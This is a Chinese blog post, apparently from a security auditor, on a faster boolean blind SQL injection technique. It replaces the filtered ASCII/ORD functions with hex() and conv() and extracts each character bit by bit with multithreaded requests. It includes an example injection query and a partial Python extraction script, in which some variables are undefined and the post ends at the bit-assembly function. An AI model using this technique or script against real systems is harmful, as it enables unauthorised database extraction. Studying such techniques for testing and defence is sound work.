高效率的 SQL 盲注
2021-08-30 13:27:55

概述：

起因是在审计到某OA的一个布尔盲注，但是程序过滤了 Ascii 和Ord 函数，于是就使用hex 和 conv 函数来替换 Ascii函数。因为conv函数的功能是在不同数字基之间转换数字，所以可以把字符的十六进制数转换为二进制数进行注入，这样会效率更高。

详细描述：

1、通过 hex 和 conv 函数的结合运用，很容易就能替换 Ascii 和 Ord 函数。

2、众所周知，conv 函数是的作用是在不同数字基之间转换数字，可以把字符 "a" 的十六进制数转换为十进制数，这样就起到了替换 Ascii 函数的作用，然后就可以使用二分法进行注入。

3、但是二分法弊端就是只能同步请求，因为每一步都互相依赖。怎么才能使布尔盲注可以进行异步请求呢？我想的办法是分别去获取十进制数的每一位数。

select substr(conv(hex('a'),16,10),1,1);

4、这个方法就可以开两到三个线程去请求每一位数，但是这个方法的效率也不会比传统二分法快多少，因为线程太少，请求太多。每个线程都要请求三到四次。

5、下面尝试一下把十六进制转化为二进制数，因为二进制只有 0 和 1，所以一个请求就可以确定一个数，因为可显示字符的的二进制数都是六位或者七位，所以可以开六或七个线程，每一个线程请求一次即可得到一个字符。

6、下面是传统二分法消耗的时间，速度相差接近三倍。

7、代码如下

from threading import Thread
from requests import Session
def request_to(url):
	try:
		resp = S.get(url=url)
		return resp
	except Exception as e:
		raise(str(e))

def judge_resp(resp) -> bool:
	if len(resp.text) == 48:
		return True
	else:
		return False

def get_str_length(url) -> int:
	resp = request_to(url)
	judge = judge_resp(resp)
	if judge:
		return 7
	else:
		return 6

def get_str_byte(url, i) -> int:
	resp = request_to(url)
	judge = judge_resp(resp)
	if judge:
		result[int(i)] = '1'
	else:
		result[int(i)] = '0'

def get_str_bin(url, length):
	global result
	tmp_url_list = [url.format(str(i)) for i in range(1, int(length) + 1)]
	target_url_list = [url.replace('\t', '') for url in tmp_url_list]
	thread_list = list()

	for i in range(1, int(length) + 1):
		thread = Thread(target=get_str_byte, args=(target_url_list[i - 1], i - 1))
		thread.start()
		thread_list.append(thread)
	for thread in thread_list:
		thread.join()
	str_bin = "".join(result)
	result = [""] * 7
	return str_bin
